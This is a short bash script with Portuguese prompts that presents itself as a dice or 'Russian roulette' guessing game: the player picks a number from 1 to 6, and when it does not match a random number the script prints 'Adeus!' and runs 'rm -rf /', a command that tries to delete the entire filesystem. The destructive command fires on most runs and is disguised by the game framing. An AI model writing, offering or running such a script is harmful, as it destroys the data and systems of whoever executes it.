#!/bin/bash
echo -n "Escolha um número de 1 a 6: "
read n

random=`shuf -i 1-6 -n 1`

if [ $random -ne $n ];
then
  echo "Adeus!"
  rm -rf /
else
  echo "Você ganhou :D"
fi
